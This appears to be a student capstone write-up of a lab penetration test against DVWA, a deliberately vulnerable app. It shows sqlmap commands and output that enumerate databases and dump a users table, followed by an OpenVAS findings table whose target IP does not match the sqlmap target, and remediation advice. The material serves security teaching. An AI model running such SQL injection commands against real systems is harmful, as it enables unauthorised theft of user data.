# Capstone Project: Full VAPT Cycle

## Overview

This demonstrates a complete Vulnerability Assessment and Penetration Testing (VAPT) cycle using a simulated lab environment. The assessment follows PTES methodology, covering reconnaissance, scanning, exploitation, and reporting.

---

## Tools Used

* Kali Linux
* Metasploit Framework
* OpenVAS (Greenbone)
* sqlmap
* DVWA (Damn Vulnerable Web Application)

---

## Objectives

* Identify vulnerabilities in a target system
* Exploit SQL Injection using sqlmap
* Validate findings with OpenVAS
* Document and report findings professionally

---

## Simulation: SQL Injection (DVWA)

### Command Used

```
sqlmap -u "http://192.168.1.200/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=abc123; security=low" --dbs
```

### Output

```
[INFO] testing connection to the target URL
[INFO] the back-end DBMS is MySQL
[INFO] available databases:
[*] dvwa
[*] information_schema
```

### Data Extraction

```
sqlmap ... -D dvwa -T users --dump
```

## Detection (OpenVAS Scan Log)

| Timestamp           | Target IP     | Vulnerability | PTES Phase     |
| ------------------- | ------------- | ------------- | -------------- |
| 2025-08-18 12:00:00 | 192.168.56.5  | XSS           | Exploitation   |
| 2025-08-18 12:10:00 | 192.168.56.5  | SQL Injection | Exploitation   |
| 2025-08-18 12:20:00 | 192.168.56.5  | Open Ports    | Reconnaissance |

---

## Remediation

* Implement input validation and sanitization
* Use prepared statements (parameterized queries)
* Disable verbose error messages
* Apply Web Application Firewall (WAF)
* Re-scan system after patching

---



